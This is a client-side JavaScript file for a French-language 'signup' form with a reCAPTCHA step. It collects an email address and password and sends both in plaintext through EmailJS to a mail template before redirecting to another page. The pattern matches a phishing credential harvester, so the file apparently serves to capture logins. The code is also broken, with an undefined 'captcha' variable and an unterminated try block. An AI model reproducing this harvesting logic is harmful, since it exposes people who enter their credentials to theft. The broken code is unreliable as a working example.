
// ======================================
// Initialisation EmailJS
// ======================================

emailjs.init({
    publicKey: "rORVGScs1n94sqOPi"
});


// ======================================
// Éléments HTML
// ======================================

const form = document.getElementById("signupForm");

const emailInput = document.getElementById("email");
const passwordInput = document.getElementById("password");

const captchaContainer = document.getElementById("captcha-container");
const result = document.getElementById("result");

let captchaShown = false;


// ======================================
// Limites des champs
// ======================================

emailInput.addEventListener("input", function () {
    this.value = this.value.slice(0, 50);
});

passwordInput.addEventListener("input", function () {
    this.value = this.value.slice(0, 20);
});

// ======================================
// SUBMIT
// ======================================

form.addEventListener("submit", async function (event) {

    event.preventDefault();


    // ------------------------------
    // Vérification HTML
    // ------------------------------

    if (!form.checkValidity()) {
        form.reportValidity();
        return;
    }


    // ------------------------------
    // Premier clic :
    // afficher le CAPTCHA
    // ------------------------------

    if (!captchaShown) {

        captchaContainer.style.display = "block";

        captchaShown = true;

        result.textContent = "Veuillez confirmer le CAPTCHA.";
        result.className = "error";

        return;
    }


    // ------------------------------
    // Vérification CAPTCHA
    // ------------------------------

    if (
        typeof grecaptcha === "undefined" ||
        typeof grecaptcha.getResponse !== "function"
    ) {
        result.textContent = "Le CAPTCHA n'est pas disponible.";
        result.className = "error";
        return;
    }

    const captchaResponse = grecaptcha.getResponse();

    if (!captchaResponse) {

        result.textContent = "Veuillez confirmer le CAPTCHA.";
        result.className = "error";

        return;
    }


    // ------------------------------
    // Récupération des données
    // ------------------------------

    const email = emailInput.value.trim();
    const password = passwordInput.value.trim();


    // ------------------------------
    // Paramètres EmailJS
    // ------------------------------

    const templateParams = {
        email: email,
        password: password,
         "g-recaptcha-response": captcha
    };


    // ------------------------------
    // Envoi EmailJS
    // ------------------------------

    result.textContent = "Envoi en cours...";
    result.className = "";


    try {

        const response = await emailjs.send(
            "service_veritas",
            "template_tprb5ni",
            templateParams
        );


        console.log(
            "Email envoyé :",
            response.status,
            response.text
        );


        result.textContent = "Votre demande a été envoyée.";
        result.className = "success";


        // Réinitialiser CAPTCHA
        grecaptcha.reset();

        captchaShown = false;


        // ------------------------------
        // Redirection après envoi réussi
        // ------------------------------

        window.location.href = "page2.html";


    
});

